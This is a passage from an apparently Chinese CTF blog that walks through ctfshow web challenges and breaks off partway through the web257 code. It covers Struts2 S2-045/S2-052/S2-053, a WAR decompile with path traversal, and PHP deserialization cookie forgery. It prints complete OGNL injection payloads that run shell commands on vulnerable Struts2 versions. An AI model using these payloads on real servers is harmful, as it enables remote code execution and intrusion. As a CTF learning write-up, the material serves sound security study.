参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击<br>影响版本: 2.0.0 - 2.3.32<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692544961840-aeae9959-6449-4b32-9af1-ab5eda4bdcf6.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545103687-b986fa24-bac8-4ea5-9cca-49abb3bad411.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545142685-a66d184c-60e4-43f5-9103-5e0549c8f1df.png" alt="image.png"><br>佬のpoc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>).(#q)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把后面的id改为env会报错，但是看着这么眼熟，像是flag。提交之后发现真是对的：<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692545401365-19dcf5d2-9d24-48e5-abfc-36b0079b8602.png" alt="image.png"><br>还可以用45的content-type</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;id&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(#ros=(<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getOutputStream())).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@copy(#process.getInputStream(),#ros)</span>).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure><h1 id="web296"><a href="#web296" class="headerlink" title="web296"></a>web296</h1><h3 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h3><p>漏洞原理<br>Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：</p><table><thead><tr><th>扩展名</th><th>Content-Type</th><th>解析方法</th></tr></thead><tbody><tr><td>xml</td><td>application/xml</td><td>xstream</td></tr><tr><td>json</td><td>application/json</td><td>jsonlib或jackson(可选)</td></tr><tr><td>xhtml</td><td>application/xhtml+xml</td><td>无</td></tr><tr><td>无</td><td>application/x-www-form-urlencoded</td><td>无</td></tr><tr><td>无</td><td>multipart/form-data</td><td>无</td></tr></tbody></table><p>jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;classname&gt;&lt;/classname&gt;</span><br><span class="line">//或者</span><br><span class="line">&lt;paramname class=&quot;classname&quot;&gt;&lt;/paramname&gt;</span><br></pre></td></tr></table></figure><p>所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedget<br>影响版本：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12<br><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-052/README.zh-cn.md</a><br>建议直接工具启动！</p><h1 id="web297"><a href="#web297" class="headerlink" title="web297"></a>web297</h1><h3 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h3><p>漏洞原理<br>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞<br>poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;printenv | grep FLAG&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h1><blockquote><p>工具：<a href="https://github.com/java-decompiler/jd-gui/releases">https://github.com/java-decompiler/jd-gui/releases</a></p></blockquote><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>提示：看看代码，了解下和php不一样的地方<br>题目附件一个war包<br>jar包和war包都可以看成压缩文件，都可以用解压软件打开，jar包和war包都是为了项目的部署和发布，通常在打包部署的时候，会在里面加上部署的相关信息。这个打包实际上就是把代码和依赖的东西压缩在一起，变成后缀名为.jar和.war的文件，就是我们说的jar包和war包。但是这个“压缩包”可以被编译器直接使用，把war包放在tomcat目录的webapp下，tomcat服务器在启动的时候可以直接使用这个war包。通常tomcat的做法是解压，编译里面的代码，所以当文件很多的时候，tomcat的启动会很慢。<br>jar包和war包的区别：jar包是java打的包，war包可以理解为javaweb打的包，这样会比较好记。jar包中只是用java来写的项目打包来的，里面只有编译后的class和一些部署文件。而war包里面的东西就全了，包括写的代码编译成的class文件，依赖的包，配置文件，所有的网站页面，包括html，jsp等等。一个war包可以理解为是一个web项目，里面是项目的所有东西。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692546287592-358916c4-a359-4a79-b07b-32ae6fb35c9c.png" alt="image.png"><br>然后去看这个getVipStatus：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547078594-3886eb60-120b-4d06-b79e-d8cfe8206fd1.png" alt="image.png"><br>但是不知道在哪里加入username和password，看了wp发现是在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctfshow/login?username=admin&amp;password=ctfshow</span><br></pre></td></tr></table></figure><p>但是不知道这个路径是哪里来的。</p><h1 id="web299"><a href="#web299" class="headerlink" title="web299"></a>web299</h1><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547324053-0afe36c1-6e1c-4a6b-a225-cd24938ac84d.png" alt="image.png"><br>访问之后发现页面没变化，感觉像是文件读取。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547431499-7895a6b5-2af5-4057-97c9-a837ecb8de82.png" alt="image.png"><br>确实可以读取，按照上一道题的文件内容访问一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547505252-22399b93-619d-49a0-9b4f-7bfe36fe2c57.png" alt="image.png"><br>终于懂了他这个路径了：<br>访问<code>WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</code><br>发现疑似flag文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547630499-b459228b-a93a-428f-92ff-6a283f7fea98.png" alt="image.png"><br>访问<code>/fl3g</code>得目录穿越一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547692626-234dd616-bf9d-4eb3-9003-4431915f9fc8.png" alt="image.png"></p><h1 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h1><p>类似上题，但是文件名为<code>/f1bg</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547796528-d30aa8b6-7ed2-48d8-8352-c0651a92428e.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web254-web278反序列化篇</title>
      <link href="/2023/09/17/web254-web278%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/"/>
      <url>/2023/09/17/web254-web278%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><p>和反序列化没啥关系，可能只是来了解一下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">      <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">      <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cookie传入反序列化参数，这里需要注意一个卡了我挺长时间的点就是分号作为cookie中分割符，反序列化中出现的分号要用url转义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%3B&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET：</span><br><span class="line">?username=xxxxxx</span><br><span class="line">&amp;password=xxxxxx</span><br><span class="line">COOKIE：</span><br><span class="line">user=O:<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>%<span class="number">3</span>Bs:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>%<span class="number">3</span>Bs:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>%<span class="number">3</span>Bs:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>%<span class="number">3</span>Bs:<span class="number">5</span>:<span class="string">&quot;isVip&quot;</span>%<span class="number">3</span>Bb:<span class="number">1</span>%<span class="number">3</span>B&#125;</span><br></pre></td></tr></table></figure><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username=admin</span><br><span class="line">&amp;password=xxxxxx</span><br><span class="line">COOKIE</span><br><span class="line">user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 